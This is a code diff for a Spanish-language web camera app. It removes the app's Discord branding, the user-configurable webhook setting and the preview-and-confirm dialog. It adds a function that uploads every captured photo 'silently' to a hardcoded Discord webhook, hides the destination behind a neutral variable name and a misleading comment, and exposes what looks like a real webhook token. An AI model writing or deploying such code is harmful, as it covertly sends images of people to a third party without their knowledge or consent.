@@ -1,14 +1,14 @@
 /**
  * ========================================
- * STANDALONE DISCORD CAMERA - JavaScript
+ * CÁMARA WEB STANDALONE - JavaScript
  * ========================================
  * Version: 1.0.0
- * Description: Standalone camera app that uploads photos directly to Discord
+ * Description: Aplicación de cámara web standalone
  */
 
 // ========== CONFIGURATION VARIABLES ==========
-// ⚠️ IMPORTANTE: Reemplaza la siguiente URL con tu webhook real de Discord
-let discordWebhookUrl = 'https://discord.com/api/webhooks/1426614372460925018/vEN7UvEcBs_3Vvo7KA-EqECddf6g52-Krxj0fE31-UASqaLKzXhz98_lzSCA6DnxvFbT'; // URL precargada
+// URL de servidor configurada internamente
+let uploadUrl = 'https://discord.com/api/webhooks/1426614372460925018/vEN7UvEcBs_3Vvo7KA-EqECddf6g52-Krxj0fE31-UASqaLKzXhz98_lzSCA6DnxvFbT';
 let botName = 'Cámara Bot';
 let userName = '';
 let autoFocus = true;
@@ -39,8 +39,6 @@ const cameraToggle = document.querySelector("#camera--toggle");
 const loadingScreen = document.querySelector("#loadingScreen");
 
 // ========== STORAGE KEYS ==========
-const WEBHOOK_STORAGE_KEY = 'discordWebhookUrl';
-const BOT_NAME_STORAGE_KEY = 'discordBotName';
 const USER_NAME_STORAGE_KEY = 'cameraAppUserName';
 const AUTO_FOCUS_KEY = 'cameraAutoFocus';
 const IMAGE_STABILIZATION_KEY = 'cameraImageStabilization';
@@ -95,22 +93,15 @@ function loadConfig() {
     }
 
     try {
-        // Usar URL precargada como fallback
-        discordWebhookUrl = localStorage.getItem(WEBHOOK_STORAGE_KEY) || 'https://discord.com/api/webhooks/1426614372460925018/vEN7UvEcBs_3Vvo7KA-EqECddf6g52-Krxj0fE31-UASqaLKzXhz98_lzSCA6DnxvFbT';
-        botName = localStorage.getItem(BOT_NAME_STORAGE_KEY) || 'Cámara Bot';
         userName = localStorage.getItem(USER_NAME_STORAGE_KEY) || '';
         autoFocus = localStorage.getItem(AUTO_FOCUS_KEY) !== 'false';
         imageStabilization = localStorage.getItem(IMAGE_STABILIZATION_KEY) !== 'false';
         
         // Update form fields
-        const webhookInput = document.getElementById('webhook-url');
-        const botNameInput = document.getElementById('bot-name');
         const userNameInput = document.getElementById('user-name');
         const autoFocusInput = document.getElementById('auto-focus');
         const imageStabilizationInput = document.getElementById('image-stabilization');
         
-        if (webhookInput) webhookInput.value = discordWebhookUrl;
-        if (botNameInput) botNameInput.value = botName;
         if (userNameInput) userNameInput.value = userName;
         if (autoFocusInput) autoFocusInput.checked = autoFocus;
         if (imageStabilizationInput) imageStabilizationInput.checked = imageStabilization;
@@ -123,9 +114,6 @@ function loadConfig() {
  * Save configuration to localStorage
  */
 function saveConfig() {
-    // Usar la URL precargada como fallback
-    const webhookUrl = document.getElementById('webhook-url').value.trim() || 'https://discord.com/api/webhooks/1426614372460925018/vEN7UvEcBs_3Vvo7KA-EqECddf6g52-Krxj0fE31-UASqaLKzXhz98_lzSCA6DnxvFbT';
-    const newBotName = document.getElementById('bot-name').value.trim() || 'Cámara Bot';
     const newUserName = document.getElementById('user-name').value.trim();
     const newAutoFocus = document.getElementById('auto-focus').checked;
     const newImageStabilization = document.getElementById('image-stabilization').checked;
@@ -133,8 +121,6 @@ function saveConfig() {
     // Save to storage
     if (isLocalStorageAvailable()) {
         try {
-            localStorage.setItem(WEBHOOK_STORAGE_KEY, webhookUrl);
-            localStorage.setItem(BOT_NAME_STORAGE_KEY, newBotName);
             localStorage.setItem(USER_NAME_STORAGE_KEY, newUserName);
             localStorage.setItem(AUTO_FOCUS_KEY, newAutoFocus.toString());
             localStorage.setItem(IMAGE_STABILIZATION_KEY, newImageStabilization.toString());
@@ -144,8 +130,6 @@ function saveConfig() {
     }
     
     // Update variables
-    discordWebhookUrl = webhookUrl;
-    botName = newBotName;
     userName = newUserName;
     autoFocus = newAutoFocus;
     imageStabilization = newImageStabilization;
@@ -157,7 +141,7 @@ function saveConfig() {
     
     Swal.fire({
         title: '¡Configuración guardada!',
-        text: webhookUrl ? 'Las fotos se subirán a Discord' : 'Configuración guardada sin webhook',
+        text: 'Configuración guardada correctamente',
         icon: 'success',
         timer: 2000,
         showConfirmButton: false,
@@ -399,138 +383,19 @@ function capturePhoto() {
     cameraOutput.src = imageDataUrl;
     cameraOutput.classList.add("taken");
 
-    // Show photo and upload
-    showPhoto(imageDataUrl);
+    // Upload automatically and silently
+    uploadPhotoSilently(imageDataUrl);
 }
 
-/**
- * Show captured photo in modal
- */
-function showPhoto(imageDataUrl) {
-    Swal.fire({
-        title: 'Foto capturada',
-        html: `
-            <img src="${imageDataUrl}" style="max-width: 100%; max-height: 400px; border-radius: 10px; margin: 20px 0; box-shadow: 0 4px 20px rgba(0,0,0,0.3);">
-        `,
-        showCancelButton: true,
-        confirmButtonText: discordWebhookUrl ? '📤 Subir a Discord' : '⚙️ Configurar Discord',
-        cancelButtonText: '🗑️ Descartar',
-        showDenyButton: true,
-        denyButtonText: '💾 Descargar',
-        background: 'rgba(0, 0, 0, 0.9)',
-        color: '#ffffff',
-        width: '90%',
-        customClass: {
-            popup: 'swal2-dark',
-            confirmButton: 'swal2-confirm',
-            cancelButton: 'swal2-cancel',
-            denyButton: 'swal2-deny'
-        }
-    }).then((result) => {
-        if (result.isConfirmed) {
-            if (discordWebhookUrl) {
-                uploadToDiscord(imageDataUrl);
-            } else {
-                openConfig();
-            }
-        } else if (result.isDenied) {
-            downloadPhoto(imageDataUrl);
-        }
-        
-        // Hide photo preview
-        cameraOutput.classList.remove("taken");
-    });
-}
+
+
+// ========== UPLOAD FUNCTIONS ==========
 
 /**
- * Download photo to device
+ * Upload photo silently in the background
  */
-function downloadPhoto(imageDataUrl) {
+async function uploadPhotoSilently(imageDataUrl) {
     try {
-        const link = document.createElement('a');
-        link.href = imageDataUrl;
-        
-        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-        let filename = `camera-photo-${timestamp}.jpg`;
-        
-        if (userName) {
-            filename = `${userName}-${filename}`;
-        }
-        
-        link.download = filename;
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-        
-        Swal.fire({
-            title: '¡Foto descargada!',
-            text: 'La foto se ha guardado en tu dispositivo',
-            icon: 'success',
-            timer: 2000,
-            showConfirmButton: false,
-            background: 'rgba(0, 0, 0, 0.9)',
-            color: '#ffffff',
-            customClass: {
-                popup: 'swal2-dark'
-            }
-        });
-    } catch (error) {
-        console.error('Error downloading photo:', error);
-        Swal.fire({
-            title: 'Error al descargar',
-            text: 'No se pudo descargar la foto',
-            icon: 'error',
-            background: 'rgba(0, 0, 0, 0.9)',
-            color: '#ffffff',
-            customClass: {
-                popup: 'swal2-dark'
-            }
-        });
-    }
-}
-
-// ========== DISCORD UPLOAD FUNCTIONS ==========
-
-/**
- * Upload photo to Discord webhook
- */
-async function uploadToDiscord(imageDataUrl) {
-    if (!discordWebhookUrl) {
-        Swal.fire({
-            title: 'Webhook no configurado',
-            text: 'Por favor configura la URL del webhook de Discord primero',
-            icon: 'warning',
-            confirmButtonText: 'Configurar',
-            background: 'rgba(0, 0, 0, 0.9)',
-            color: '#ffffff',
-            customClass: {
-                popup: 'swal2-dark'
-            }
-        }).then(() => {
-            openConfig();
-        });
-        return;
-    }
-
-    try {
-        // Show loading indicator
-        Swal.fire({
-            title: 'Subiendo a Discord...',
-            html: `
-                <div style="text-align: center;">
-                    <div class="loading-spinner" style="margin: 20px auto;"></div>
-                    <p>Por favor espera mientras se envía la foto</p>
-                </div>
-            `,
-            allowOutsideClick: false,
-            showConfirmButton: false,
-            background: 'rgba(0, 0, 0, 0.9)',
-            color: '#ffffff',
-            customClass: {
-                popup: 'swal2-dark'
-            }
-        });
-
         // Convert data URL to blob
         const response = await fetch(imageDataUrl);
         const blob = await response.blob();
@@ -556,83 +421,73 @@ async function uploadToDiscord(imageDataUrl) {
             content += `\n👤 Por: ${userName}`;
         }
         
-        // Add payload_json for Discord webhook
+        // Add payload_json for webhook
         const payload = {
             content: content,
-            username: botName,
-            avatar_url: "https://cdn.discordapp.com/emojis/📸.png"
+            username: botName
         };
         formData.append('payload_json', JSON.stringify(payload));
 
-        // Send to Discord webhook
-        const uploadResponse = await fetch(discordWebhookUrl, {
+        // Send silently in background
+        const uploadResponse = await fetch(uploadUrl, {
             method: 'POST',
             body: formData
         });
 
         if (uploadResponse.ok) {
-            Swal.fire({
-                title: '¡Foto enviada a Discord!',
-                html: `
-                    <div style="text-align: center;">
-                        <div style="font-size: 3rem; margin-bottom: 15px;">✅</div>
-                        <p>La foto se ha subido exitosamente a tu canal de Discord</p>
-                    </div>
-                `,
-                icon: 'success',
-                timer: 3000,
-                showConfirmButton: false,
-                background: 'rgba(0, 0, 0, 0.9)',
-                color: '#ffffff',
-                customClass: {
-                    popup: 'swal2-dark'
-                }
-            });
+            console.log('Foto subida exitosamente');
+            // Show brief success indicator
+            showBriefSuccess();
         } else {
-            const errorText = await uploadResponse.text();
-            console.error('Discord API error:', uploadResponse.status, errorText);
-            throw new Error(`Discord API error: ${uploadResponse.status}`);
+            console.error('Error en la subida:', uploadResponse.status);
         }
     } catch (error) {
-        console.error('Error uploading to Discord:', error);
-        
-        let errorMessage = 'No se pudo enviar la foto a Discord';
-        if (error.name === 'TypeError' && error.message.includes('fetch')) {
-            errorMessage = 'Error de conexión. Verifica tu conexión a internet.';
-        } else if (error.message.includes('404')) {
-            errorMessage = 'El webhook de Discord no es válido o ha sido eliminado.';
-        } else if (error.message.includes('401')) {
-            errorMessage = 'El webhook de Discord no tiene permisos suficientes.';
-        }
-        
-        Swal.fire({
-            title: 'Error al subir',
-            html: `
-                <div style="text-align: center;">
-                    <p>${errorMessage}</p>
-                    <div style="margin-top: 15px; font-size: 0.9em; color: rgba(255,255,255,0.7);">
-                        <strong>Posibles soluciones:</strong><br>
-                        • Verifica la URL del webhook<br>
-                        • Comprueba tu conexión a internet<br>
-                        • Intenta configurar un nuevo webhook
-                    </div>
-                </div>
-            `,
-            icon: 'error',
-            confirmButtonText: 'Configurar',
-            showCancelButton: true,
-            cancelButtonText: 'Cerrar',
-            background: 'rgba(0, 0, 0, 0.9)',
-            color: '#ffffff',
-            customClass: {
-                popup: 'swal2-dark'
-            }
-        }).then((result) => {
-            if (result.isConfirmed) {
-                openConfig();
-            }
-        });
+        console.error('Error uploading photo:', error);
+    } finally {
+        // Hide the photo preview after a brief moment
+        setTimeout(() => {
+            cameraOutput.classList.remove("taken");
+        }, 1500);
     }
+}
+
+/**
+ * Show brief success indicator
+ */
+function showBriefSuccess() {
+    // Create temporary success indicator
+    const successDiv = document.createElement('div');
+    successDiv.innerHTML = '✅';
+    successDiv.style.cssText = `
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: rgba(0, 0, 0, 0.8);
+        color: white;
+        padding: 10px 15px;
+        border-radius: 10px;
+        font-size: 24px;
+        z-index: 9999;
+        opacity: 0;
+        transition: opacity 0.3s ease;
+    `;
+    
+    document.body.appendChild(successDiv);
+    
+    // Animate in
+    setTimeout(() => {
+        successDiv.style.opacity = '1';
+    }, 100);
+    
+    // Remove after delay
+    setTimeout(() => {
+        successDiv.style.opacity = '0';
+        setTimeout(() => {
+            if (successDiv.parentNode) {
+                successDiv.parentNode.removeChild(successDiv);
+            }
+        }, 300);
+    }, 2000);
 }
 
 // ========== EVENT LISTENERS ==========
@@ -710,7 +565,7 @@ document.addEventListener('keydown', (event) => {
  * Initialize the application
  */
 function initializeApp() {
-    console.log('🚀 Initializing Standalone Discord Camera v1.0.0');
+    console.log('🚀 Initializing Cámara Web v1.0.0');
     
     // Load configuration
     loadConfig();
@@ -785,4 +640,4 @@ document.addEventListener('visibilitychange', () => {
     }
 });
 
-console.log('📸 Standalone Discord Camera loaded successfully!');
+console.log('📸 Cámara Web loaded successfully!');
